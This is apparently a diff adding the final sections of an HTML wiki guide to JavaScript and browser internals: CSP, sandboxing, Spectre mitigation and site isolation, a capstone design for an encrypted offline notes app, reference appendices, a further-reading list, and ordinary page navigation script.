+<h2 id="51-browser-security-internals-csp-sandboxing-spectre-site-isolation">51. Browser security internals: CSP, sandboxing, Spectre, site isolation<a class="anchor" href="#51-browser-security-internals-csp-sandboxing-spectre-site-isolation" aria-hidden="true">#</a></h2>
+<p><strong>Content Security Policy (CSP)</strong> is an HTTP response header that whitelists exactly where scripts/styles/frames/etc. are allowed to load from — the actual, effective defense against XSS that §47 pointed to, because even a successful HTML-injection can't execute a <code>&lt;script&gt;</code> tag or inline handler the policy doesn't permit:</p>
+<pre><code>Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com;
+                          object-src 'none'; base-uri 'self'; frame-ancestors 'none'
+
+default-src 'self'      -&gt; only load resources from this same origin by default
+script-src ... (no 'unsafe-inline')  -&gt; inline &lt;script&gt; tags AND inline event
+                                          handlers (onclick="...") are BLOCKED —
+                                          this alone defeats the majority of
+                                          real-world reflected/stored XSS payloads
+object-src 'none'       -&gt; blocks &lt;object&gt;/&lt;embed&gt;, a historical plugin-based
+                              XSS vector
+frame-ancestors 'none'  -&gt; prevents this page from being framed by anyone
+                              (clickjacking defense, replaces the older
+                              X-Frame-Options header)</code></pre>
+<p><strong>Renderer sandboxing</strong> (§18) restricts what a compromised renderer process can do at the OS level — Chrome's sandbox on Linux uses <code>seccomp-bpf</code> to filter which syscalls a renderer can even make, so exploiting a JS engine bug doesn't automatically grant filesystem/network access; the exploit would also need a <em>separate</em> sandbox-escape bug.</p>
+<p><strong>Spectre</strong> (2018) demonstrated that speculative execution — a CPU performance optimization present in virtually all modern processors — could be abused to read memory across security boundaries <em>within the same process</em> via precise timing measurements, defeating purely software-level isolation like "different JS objects can't see each other's data." Browsers' actual mitigation wasn't a JS-level patch (the leak is a CPU hardware behavior, not a JS bug) but <strong>process-level isolation</strong>: site isolation (§18) ensures cross-origin data physically lives in a different process with its own separate memory space, so even a successful Spectre read from within a malicious page's renderer process cannot reach another origin's data — it was never mapped into that process's address space at all. This is also why <code>SharedArrayBuffer</code>/<code>Atomics</code> (§39, which provide the high-resolution shared-memory timer Spectre-style attacks need) stay disabled unless a page explicitly opts into cross-origin isolation.</p>
+<hr>
+<h1 id="part-ix-capstone">Part IX — Capstone<a class="anchor" href="#part-ix-capstone" aria-hidden="true">#</a></h1>
+<h2 id="52-capstone-an-offline-first-multi-threaded-end-to-end-encrypted-notes-pwa">52. Capstone: an offline-first, multi-threaded, end-to-end-encrypted notes PWA<a class="anchor" href="#52-capstone-an-offline-first-multi-threaded-end-to-end-encrypted-notes-pwa" aria-hidden="true">#</a></h2>
+<p>Architecture combining nearly every part of this guide into one app:</p>
+<pre><code>┌──────────────────────────────────────────────────────────────────┐
+│  Main thread (Part I-II: app logic, Part V: rendering)             │
+│   - Signal/VDOM-based UI (§33) renders the notes list              │
+│   - On save: calls into a Worker Pool (§41) for encryption          │
+│     so a large note never blocks a keystroke's UI update            │
+├──────────────────────────────────────────────────────────────────┤
+│  Crypto Worker (Part VI, VII: §38, §46)                             │
+│   - Owns the derived AES-GCM key (Part VII §46) — kept OUT of the    │
+│     main thread's global scope specifically to shrink the window     │
+│     an XSS payload could reach it (defense in depth, NOT a fix —     │
+│     §47's XSS caveat still fully applies since a compromised main    │
+│     thread can still just ASK this worker to encrypt/decrypt for it) │
+│   - Encrypts/decrypts notes via postMessage RPC (Comlink-style, §41) │
+├──────────────────────────────────────────────────────────────────┤
+│  IndexedDB (§45)                                                     │
+│   - Stores ONLY ciphertext + iv, keyed by note id                   │
+├──────────────────────────────────────────────────────────────────┤
+│  Service Worker (§40)                                                │
+│   - Precaches the app shell -&gt; works fully offline                  │
+│   - Background-syncs encrypted blobs to a server when connectivity   │
+│     returns, using the Background Sync API                          │
+├──────────────────────────────────────────────────────────────────┤
+│  Server (Part IV: HTTP)                                              │
+│   - Receives and stores ONLY ciphertext — genuinely zero-knowledge:  │
+│     a server breach exposes no readable note content                │
+│   - Response headers set Content-Security-Policy (§51),              │
+│     Cross-Origin-Opener-Policy + Cross-Origin-Embedder-Policy (§39)  │
+│     to enable SharedArrayBuffer if the crypto worker pool needs it   │
+│     for large-note streaming encryption                              │
+└──────────────────────────────────────────────────────────────────┘</code></pre>
+<p>Build order that exercises every Part in sequence:</p>
+<ol>
+<li><strong>Part I-II</strong>: the note data model, an async save/load API with a task queue limiting concurrent encrypt operations.</li>
+<li><strong>Part III</strong>: verify the app's DOM updates don't force synchronous layout on every keystroke (Performance panel check, §24).</li>
+<li><strong>Part IV</strong>: the sync-to-server <code>fetch</code> client, with retry/backoff (§31) for flaky connectivity — exactly the resilient client built in §31.</li>
+<li><strong>Part V</strong>: render the notes list with a signal-based or VDOM approach (§33) so typing in one note never re-renders the whole list.</li>
+<li><strong>Part VI</strong>: move encryption into a dedicated worker (§38, §41) so a large note's encryption never drops a keystroke frame.</li>
+<li><strong>Part VII</strong>: derive the key from the user's password (§46), store only ciphertext in IndexedDB (§45), and register the Service Worker (§40) for offline capability.</li>
+<li><strong>Part VIII</strong>: set a strict CSP (§51) as the actual XSS defense per §47's threat-model lesson, and heap-snapshot-check (§50) that closing a note view doesn't leak its decrypted plaintext via a lingering closure.</li>
+</ol>
+<p>This is deliberately the same shape as real production apps (Signal's web client, Standard Notes, Bitwarden's web vault) — zero-knowledge encryption, offline-first via Service Worker, and worker-offloaded crypto are not academic exercises, they're the actual architecture of every serious client-side-encrypted web app shipping today.</p>
+<hr>
+<h2 id="appendix-a-event-loop-task-ordering-cheat-sheet">Appendix A: Event-loop task-ordering cheat sheet<a class="anchor" href="#appendix-a-event-loop-task-ordering-cheat-sheet" aria-hidden="true">#</a></h2>
+<pre><code>Per event loop turn:
+1. Execute ONE task from the macrotask queue (a whole &lt;script&gt;, a setTimeout
+   callback, a UI event handler, an I/O completion)
+2. Drain the ENTIRE microtask queue (Promise .then/.catch/.finally callbacks,
+   queueMicrotask, async/await resumptions) — including any NEW microtasks
+   queued by microtasks that just ran
+3. If it's time for a frame: run requestAnimationFrame callbacks, then
+   style/layout/paint (Part III)
+4. Repeat from step 1
+
+Ordering priority, highest to lowest:
+  synchronous code  &gt;  microtasks (Promises)  &gt;  requestAnimationFrame  &gt;
+  macrotasks (setTimeout, I/O, most events)  &gt;  requestIdleCallback</code></pre>
+<h2 id="appendix-b-storage-options-comparison-table">Appendix B: Storage options comparison table<a class="anchor" href="#appendix-b-storage-options-comparison-table" aria-hidden="true">#</a></h2>
+<div class="tbl"><table>
+<thead><tr><th></th><th>Sent with HTTP requests</th><th>Sync/Async</th><th>Capacity</th><th>Scope</th><th>Best for</th></tr></thead>
+<tbody>
+<tr><td>Cookies</td><td>Yes, automatically</td><td>Sync (<code>document.cookie</code>)</td><td>~4KB</td><td>Configurable via <code>Domain</code>/<code>Path</code></td><td>Auth tokens (as <code>HttpOnly</code>), small server-needed flags</td></tr>
+<tr><td><code>localStorage</code></td><td>No</td><td>Sync</td><td>~5-10MB</td><td>Per-origin, persists forever</td><td>Small persistent client-only prefs</td></tr>
+<tr><td><code>sessionStorage</code></td><td>No</td><td>Sync</td><td>~5-10MB</td><td>Per-tab, per-origin, dies with tab</td><td>Per-tab draft/wizard state</td></tr>
+<tr><td>IndexedDB</td><td>No</td><td>Async</td><td>Large (browser-managed, often 100s of MB+)</td><td>Per-origin, persists</td><td>Structured/large offline data, encrypted blobs</td></tr>
+<tr><td>Cache API</td><td>No</td><td>Async</td><td>Large, shares quota with IndexedDB</td><td>Per-origin, managed by Service Worker</td><td>Cached network responses for offline use</td></tr>
+<tr><td>In-memory (JS variable)</td><td>No</td><td>Sync</td><td>Limited by heap</td><td>Dies on page reload/navigation</td><td>Secrets you deliberately want to NOT persist</td></tr>
+</tbody></table></div>
+<h2 id="appendix-c-web-crypto-api-cheat-sheet">Appendix C: Web Crypto API cheat sheet<a class="anchor" href="#appendix-c-web-crypto-api-cheat-sheet" aria-hidden="true">#</a></h2>
+<div class="tbl"><table>
+<thead><tr><th>Need</th><th>API call</th></tr></thead>
+<tbody>
+<tr><td>Hash data (integrity, not passwords)</td><td><code>crypto.subtle.digest("SHA-256", data)</code></td></tr>
+<tr><td>Generate a random symmetric key</td><td><code>crypto.subtle.generateKey({name:"AES-GCM", length:256}, ...)</code></td></tr>
+<tr><td>Encrypt/decrypt with a symmetric key</td><td><code>crypto.subtle.encrypt/decrypt({name:"AES-GCM", iv}, key, data)</code></td></tr>
+<tr><td>Derive a key from a password</td><td><code>crypto.subtle.deriveKey({name:"PBKDF2", salt, iterations, hash}, ...)</code></td></tr>
+<tr><td>Generate cryptographically secure randomness</td><td><code>crypto.getRandomValues(new Uint8Array(n))</code> — never <code>Math.random()</code> for security</td></tr>
+<tr><td>Sign/verify (authenticity)</td><td><code>crypto.subtle.sign/verify({name:"ECDSA", hash:"SHA-256"}, key, data)</code></td></tr>
+<tr><td>Generate a UUID</td><td><code>crypto.randomUUID()</code></td></tr>
+</tbody></table></div>
+<h2 id="appendix-d-glossary">Appendix D: Glossary<a class="anchor" href="#appendix-d-glossary" aria-hidden="true">#</a></h2>
+<ul>
+<li><strong>Realm</strong> — an isolated JS execution environment with its own global object, call stack, and event loop (a tab, an iframe, or a worker each get their own).</li>
+<li><strong>Hidden class / Shape</strong> — V8's internal representation of an object's property layout, used to make property access fast for objects with consistent shapes (§49).</li>
+<li><strong>Structured clone</strong> — the copying algorithm used by <code>postMessage</code>, <code>structuredClone()</code>, and IndexedDB, supporting most built-in types but not functions or DOM nodes (§38).</li>
+<li><strong>Cross-origin isolation</strong> — the <code>COOP</code>+<code>COEP</code> header combination required to re-enable <code>SharedArrayBuffer</code> after the 2018 Spectre-driven lockdown (§39).</li>
+<li><strong>Hydration</strong> — attaching client-side interactivity to server-rendered static HTML without re-creating the DOM (§34).</li>
+<li><strong>Jank</strong> — a dropped or late frame, perceived as visual stutter, caused by exceeding the ~16.6ms frame budget (§22).</li>
+</ul>
+<h2 id="appendix-e-further-reading">Appendix E: Further reading<a class="anchor" href="#appendix-e-further-reading" aria-hidden="true">#</a></h2>
+<p>Organized to mirror the guide's Parts, so you can go deep on exactly the topic you just read, rather than a flat undifferentiated list.</p>
+<h3 id="e-1-language-fundamentals-part-i-ii">E.1 — Language fundamentals (Part I–II)<a class="anchor" href="#e-1-language-fundamentals-part-i-ii" aria-hidden="true">#</a></h3>
+<ul>
+<li><strong>ECMA-262</strong> (<code>tc39.es/ecma262</code>) — the actual, current ECMAScript specification. Dense, but it is the <em>only</em> fully authoritative source when MDN's prose and a language edge case disagree; worth learning to navigate even if you never read it cover to cover.</li>
+<li><strong>TC39 proposals repo</strong> (<code>github.com/tc39/proposals</code>) — track upcoming language features by stage (0–4) before they ship; the fastest way to know whether a syntax you saw in a blog post is real, experimental, or abandoned.</li>
+<li><strong>MDN JavaScript Guide &amp; Reference</strong> (<code>developer.mozilla.org/en-US/docs/Web/JavaScript</code>) — the canonical day-to-day reference for every built-in, operator, and method in Part I; also the best browser-compatibility data source (the "Browser compatibility" table at the bottom of every page).</li>
+<li><strong>"You Don't Know JS (Yet)"</strong> by Kyle Simpson — a free, open-source book series (<code>github.com/getify/You-Dont-Know-JS</code>) that goes deeper than this guide specifically on scope/closures, <code>this</code>/prototypes, and async — the natural next stop after Part I-II if any single chapter here felt rushed.</li>
+<li><strong>"Eloquent JavaScript"</strong> by Marijn Haverbeke (<code>eloquentjavascript.net</code>, free online) — a slower-paced, project-driven alternative path through the same fundamentals, with a stronger emphasis on writing real programs early.</li>
+<li><strong>2ality</strong> blog by Dr. Axel Rauschmayer (<code>2ality.com</code>) — the most reliable ongoing source of precise, spec-accurate deep dives on individual language features (destructuring, iterators, generators, <code>Symbol.iterator</code>) as they ship.</li>
+<li><strong>"Tasks, microtasks, queues and schedules"</strong> by Jake Archibald (<code>jakearchibald.com</code>) — the single canonical explainer for §12's event-loop task/microtask ordering, written by a browser engineer who worked on the spec text itself; read this if §12's ASCII diagram wasn't enough.</li>
+</ul>
+<h3 id="e-2-browser-internals-and-rendering-part-iii-v">E.2 — Browser internals and rendering (Part III, V)<a class="anchor" href="#e-2-browser-internals-and-rendering-part-iii-v" aria-hidden="true">#</a></h3>
+<ul>
+<li><strong>"How Browsers Work: Behind the scenes of modern web browsers"</strong> by Tali Garsiel and Paul Irish (originally HTML5Rocks, mirrored on <code>web.dev</code>) — the classic, exhaustive walkthrough of the rendering pipeline this guide's §21 summarizes; covers parsing algorithms and layout in far more depth.</li>
+<li><strong>"Inside look at modern web browser"</strong> (4-part series, Chrome team, <code>developer.chrome.com</code>) — walks the exact multi-process architecture from §18 (browser process, renderer process, compositor, GPU process) with diagrams from the people who built Chromium's implementation.</li>
+<li><strong>Chromium project design docs</strong> (<code>chromium.org</code> → Developer documentation) — primary-source design documents for site isolation, the compositor, and Blink's rendering pipeline, for when a blog-post-level explanation isn't precise enough.</li>
+<li><strong>Mozilla Hacks</strong> (<code>hacks.mozilla.org</code>) — Gecko/SpiderMonkey engineering team's own blog; the best source for <em>why</em> Firefox's engine made a different architectural choice than Chromium on a given feature (§19).</li>
+<li><strong>WebKit Blog</strong> (<code>webkit.org/blog</code>) — same role for Safari/JavaScriptCore; cross-reference all three engine blogs when debugging a real cross-browser rendering discrepancy rather than guessing from behavior alone.</li>
+<li><strong>web.dev's Rendering Performance guide</strong> (<code>web.dev</code> → Learn → Rendering Performance) — a practical companion to §21-22's layout/paint/composite pipeline, with more CSS-property-by-property "what triggers what" detail.</li>
+</ul>
+<h3 id="e-3-http-networking-and-browser-transport-part-iv">E.3 — HTTP, networking, and browser transport (Part IV)<a class="anchor" href="#e-3-http-networking-and-browser-transport-part-iv" aria-hidden="true">#</a></h3>
+<ul>
+<li><strong>"High Performance Browser Networking"</strong> by Ilya Grigorik — free online (<code>hpbn.co</code>) and in print; the definitive deep dive on TCP, TLS, HTTP/1.1, HTTP/2, and mobile network behavior from a browser-performance angle, written by a Google engineer who worked on the relevant Chrome subsystems.</li>
+<li><strong>"http2 explained"</strong> and <strong>"http3 explained"</strong> by Daniel Stenberg (curl's author) — free ebooks (<code>github.com/bagder</code>) that go far deeper into the wire-level framing/multiplexing mechanics §26 only summarizes.</li>
+<li><strong>MDN HTTP docs</strong> (<code>developer.mozilla.org/en-US/docs/Web/HTTP</code>) — the canonical reference for every header, status code, and caching directive used across Part IV.</li>
+<li><strong>web.dev's "Fast load times" guide</strong> (<code>web.dev</code> → Learn → Performance) — practical resource-hint (<code>preconnect</code>/<code>preload</code>/<code>prefetch</code>) guidance extending §26.</li>
+<li><a href="../networking/tcp-ip/real-life-example.html"><code>wiki/networking/tcp-ip/real-life-example.md</code></a> — this wiki's own networking companion guide for the TCP/TLS/DNS mechanics underneath every <code>fetch()</code> call in Part IV, in full depth.</li>
+<li><a href="../scale-perf/real-life-scale-guide.html"><code>wiki/scale-perf/real-life-scale-guide.md</code></a> — once an endpoint built with Part IV's <code>fetch</code> patterns is live, this wiki's load-testing/latency-percentile guide covers how to actually measure and stress-test it under real traffic.</li>
+</ul>
+<h3 id="e-4-concurrency-and-multi-threaded-browser-apps-part-vi">E.4 — Concurrency and multi-threaded browser apps (Part VI)<a class="anchor" href="#e-4-concurrency-and-multi-threaded-browser-apps-part-vi" aria-hidden="true">#</a></h3>
+<ul>
+<li><strong>MDN Web Workers API</strong> and <strong>MDN "Using web workers"</strong> guide — the canonical reference and tutorial for §38's <code>postMessage</code>/structured-clone mechanics.</li>
+<li><strong>web.dev's cross-origin isolation guide</strong> (<code>web.dev</code> → search "COOP COEP") — the practical, up-to-date checklist for enabling <code>SharedArrayBuffer</code> (§39), including common misconfigurations that leave it silently disabled.</li>
+<li><strong>Comlink</strong> by Surma/GoogleChromeLabs (<code>github.com/GoogleChromeLabs/comlink</code>) — the actual RPC-over-<code>postMessage</code> library §41 describes the pattern of; read its README and source (it's small) to see the <code>Proxy</code>-based trick that makes worker calls look synchronous-ish.</li>
+<li><strong>Surma's blog</strong> (<code>surma.dev</code>) — sustained, practical writing on Web Workers, WASM threads, and offloading architecture from one of the engineers who built much of the tooling in this space.</li>
+<li><strong>"Is <code>postMessage</code> slow?"</strong> and related perf-focused posts on <code>web.dev</code>/<code>developer.chrome.com</code> — for when a worker-pool architecture's message-passing overhead itself becomes the bottleneck.</li>
+</ul>
+<h3 id="e-5-client-side-storage-and-encryption-part-vii">E.5 — Client-side storage and encryption (Part VII)<a class="anchor" href="#e-5-client-side-storage-and-encryption-part-vii" aria-hidden="true">#</a></h3>
+<ul>
+<li><strong>W3C Web Cryptography API specification</strong> (<code>w3.org/TR/WebCryptoAPI</code>) — the formal spec behind every <code>crypto.subtle</code> call in §46; useful for confirming exact algorithm parameter names/shapes across browsers.</li>
+<li><strong>MDN Web Crypto API, Web Storage API, and IndexedDB API</strong> references — the day-to-day lookup for the exact method signatures used in §44-46.</li>
+<li><strong><code>idb</code></strong> by Jake Archibald (<code>github.com/jakearchibald/idb</code>) — the de facto standard Promise-based wrapper around raw IndexedDB (§45); reading its source is the fastest way to understand the transaction lifecycle edge cases the raw callback API hides.</li>
+<li><strong>OWASP Cheat Sheet Series</strong> (<code>cheatsheetseries.owasp.org</code>) — specifically the <em>Cryptographic Storage</em>, <em>XSS Prevention</em>, and <em>Content Security Policy</em> cheat sheets, the authoritative source behind §47 and §51's security guidance.</li>
+<li><a href="../security/real-life-guide.html"><code>wiki/security/real-life-guide.md</code></a> — this wiki's security guide goes much deeper on the cryptographic primitives themselves (key sizes, algorithm selection trade-offs, PKI) that §46 only introduces at the API-usage level.</li>
+</ul>
+<h3 id="e-6-engine-internals-and-browser-security-part-viii">E.6 — Engine internals and browser security (Part VIII)<a class="anchor" href="#e-6-engine-internals-and-browser-security-part-viii" aria-hidden="true">#</a></h3>
+<ul>
+<li><strong>V8 blog</strong> (<code>v8.dev/blog</code>) — primary-source posts from the V8 team on Ignition, Sparkplug, TurboFan, and hidden-class/inline-cache mechanics (§49), written by the engineers who implemented them.</li>
+<li><strong>"A tour of V8"</strong> series by Vyacheslav Egorov (<code>mrale.ph</code>) — an independent, unusually detailed technical dive into V8's object representation and garbage collector, referenced widely in the JS-engine community.</li>
+<li><strong>"Ignition: Jump-starting an interpreter"</strong> (V8 blog) — the specific design-rationale post for why V8 added a bytecode interpreter tier at all, directly extending §49's pipeline diagram.</li>
+<li><strong>Spectre attack</strong> reference site and original paper (<code>spectreattack.com</code>) — the primary source for §51's speculative-execution side-channel discussion, including the original PoC code.</li>
+<li><strong>Chromium Site Isolation design docs</strong> (<code>chromium.org</code> → Chromium Security → Site Isolation) — the concrete engineering response to Spectre described at a high level in §18/§51.</li>
+<li><strong>web.dev's Content Security Policy guide</strong> — practical CSP-authoring guidance (directive-by-directive) extending §51's policy example.</li>
+</ul>
+<h3 id="books-worth-owning">Books worth owning<a class="anchor" href="#books-worth-owning" aria-hidden="true">#</a></h3>
+<ul>
+<li><em>You Don't Know JS (Yet)</em> — Kyle Simpson (free online, also in print).</li>
+<li><em>Eloquent JavaScript</em> — Marijn Haverbeke (free online, also in print).</li>
+<li><em>JavaScript: The Definitive Guide</em> — David Flanagan (O'Reilly) — the closest thing to a comprehensive paper reference for the whole language.</li>
+<li><em>High Performance Browser Networking</em> — Ilya Grigorik (free online, O'Reilly in print) — Part IV's networking material, in full depth.</li>
+<li><em>Secrets of the JavaScript Ninja</em> — John Resig &amp; Bear Bibeault — closures, <code>this</code>, and DOM/event internals with the same "how does this actually work" angle as Part I-III of this guide.</li>
+</ul>
+<h3 id="this-wiki-s-companion-guides">This wiki's companion guides<a class="anchor" href="#this-wiki-s-companion-guides" aria-hidden="true">#</a></h3>
+<ul>
+<li><a href="../networking/tcp-ip/real-life-example.html"><code>wiki/networking/tcp-ip/real-life-example.md</code></a> — the networking companion for the TCP/TLS/DNS layer underneath every <code>fetch()</code> call in Part IV.</li>
+<li><a href="../scale-perf/real-life-scale-guide.html"><code>wiki/scale-perf/real-life-scale-guide.md</code></a> — load-testing, latency percentiles, and traffic simulation for the APIs and endpoints built with the patterns in Part IV.</li>
+<li><a href="../security/real-life-guide.html"><code>wiki/security/real-life-guide.md</code></a> — goes deeper on the cryptography, CSP, and attack/defense material only introduced here in Parts VII-VIII.</li>
+</ul>
+
+    </article>
+  </div>
+</div>
+<button class="totop" id="toTop" title="Back to top">↑ Top</button>
+<script>
+(function(){
+  var side = document.querySelector('.sidebar');
+  var btn  = document.getElementById('navToggle');
+  if(btn){ btn.addEventListener('click', function(){ side.classList.toggle('open'); }); }
+  document.querySelectorAll('#toc a').forEach(function(a){
+    a.addEventListener('click', function(){ if(window.innerWidth<=1024) side.classList.remove('open'); });
+  });
+
+  // scroll-spy
+  var links = {};
+  document.querySelectorAll('#toc a').forEach(function(a){
+    var id = a.getAttribute('href').slice(1); links[id] = a;
+  });
+  var targets = Object.keys(links).map(function(id){ return document.getElementById(id); }).filter(Boolean);
+  var current = null;
+  var obs = new IntersectionObserver(function(entries){
+    entries.forEach(function(e){
+      if(e.isIntersecting){
+        if(current) current.classList.remove('active');
+        var l = links[e.target.id];
+        if(l){ l.classList.add('active'); current = l;
+          l.scrollIntoView({block:'nearest'}); }
+      }
+    });
+  }, {rootMargin:'0px 0px -80% 0px', threshold:0});
+  targets.forEach(function(t){ obs.observe(t); });
+
+  // back to top
+  var top = document.getElementById('toTop');
+  window.addEventListener('scroll', function(){
+    if(window.scrollY > 1200) top.classList.add('show'); else top.classList.remove('show');
+  }, {passive:true});
+  top.addEventListener('click', function(){ window.scrollTo({top:0, behavior:'smooth'}); });
+})();
+</script>
+</body>
+</html>
